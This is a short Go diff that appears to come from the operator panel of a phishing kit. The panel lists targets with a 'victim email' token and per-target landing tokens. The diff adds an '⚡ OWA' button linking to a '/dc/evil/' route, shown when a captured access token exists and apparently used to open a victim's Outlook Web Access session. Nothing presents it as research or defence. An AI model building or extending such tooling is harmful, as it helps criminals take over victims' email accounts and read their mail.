@@ -995,9 +995,14 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 					template.HTMLEscapeString(previewURL))
 				if at != "" {
 					useURL := "/dc/use/" + tgt.LandingToken
+					evilURL := "/dc/evil/" + tgt.LandingToken
 					tokenCell = fmt.Sprintf(
-						`<a href="%s" target="_blank" style="display:inline-block;background:#0078d4;color:#fff;padding:4px 12px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none;letter-spacing:.3px">Open Dashboard</a>`,
-						template.HTMLEscapeString(useURL))
+						`<div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+<a href="%s" target="_blank" style="display:inline-block;background:#0078d4;color:#fff;padding:4px 12px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none;letter-spacing:.3px">Open Dashboard</a>
+<a href="%s" target="_blank" style="display:inline-block;background:#155724;border:1px solid #28a745;color:#fff;padding:4px 10px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none">⚡ OWA</a>
+</div>`,
+						template.HTMLEscapeString(useURL),
+						template.HTMLEscapeString(evilURL))
 				}
 
 				b.WriteString(fmt.Sprintf(`<tr>
